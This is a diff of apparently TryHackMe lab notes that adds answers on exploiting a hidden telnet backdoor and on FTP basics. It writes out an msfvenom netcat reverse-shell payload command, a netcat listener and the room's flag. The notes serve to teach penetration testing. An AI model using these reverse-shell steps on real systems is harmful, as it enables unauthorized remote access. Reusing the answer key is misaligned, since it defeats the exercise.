@@ -157,13 +157,99 @@ Ans:0
 NOTE: Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. 
 It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.
 Question 26:Based on the title returned to us, what do we think this port could be used for?
-Ans: 
+Ans: a backdoor
 
 Question 27: Who could it belong to? Gathering possible usernames is an important step in enumeration.
-Ans: 
+Ans: Skidy
 
 NOTE: Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.
 
+Exploiting Telnet
+
+There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:
+https://www.cvedetails.com/
+https://cve.mitre.org/
+
+Method Breakdown
+So, from our enumeration stage, we know:
+    - There is a poorly hidden telnet service running on this machine
+    - The service itself is marked "backdoor"
+    - We have possible username of "Skidy" implicated
+Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!
+
+What is a Reverse Shell?
+
+A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.
+
+Question 28: Great! It's an open telnet connection! What welcome message do we receive?
+Ans: SKIDY'S BACKDOOR.
+
+Question 29: Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
+Ans: N
+
+Note: Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.
+
+Start a tcpdump listener on your local machine.
+If using your own machine with the OpenVPN connection, use:
+sudo tcpdump ip proto \\icmp -i tun0
+If using the AttackBox, use:
+sudo tcpdump ip proto \\icmp -i ens5
+
+Note: This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.
+
+Question 30: Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
+Ans: Y
+Note: Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!
+
+We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
+
+"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
+-p = payload
+lhost = our local host IP address (this is your machine's IP address)
+lport = the port to listen on (this is the port on your machine)
+R = export the payload in raw format
+
+Question 31: What word does the generated payload start with?
+Ans: mkfifo
+
+Question 32: Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:
+"nc -lvnp [listening port]"
+What would the command look like for the listening port we selected in our payload?
+Ans: nc -lvnp 4444
+
+Note: Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!
+
+Question 33: Success! What is the contents of flag.txt?
+Ans: THM{y0u_g0t_th3_t3ln3t_fl4g}
+
+Understanding FTP
+
+What is FTP?
+Protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.
+
+How does FTP work?
+A typical FTP session operates using two channels:
+- A command (sometimes called the control) channel: command channel is used for transmitting commands as well as replies to those commands
+- A data channel: data channel is used for transferring data.
+
+Active vs Passive
+
+The FTP server may support either Active or Passive connections, or both. 
+In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
+In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it. 
+
+This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.
+
+More Details:https://www.ietf.org/rfc/rfc959.txt
+
+Question 34: What communications model does FTP use?
+Ans: client-server
+
+Question 35: What's the standard FTP port?
+Ans: 21
+
+Question 36: How many modes of FTP connection are there?   
+Ans: 2
 
 
 
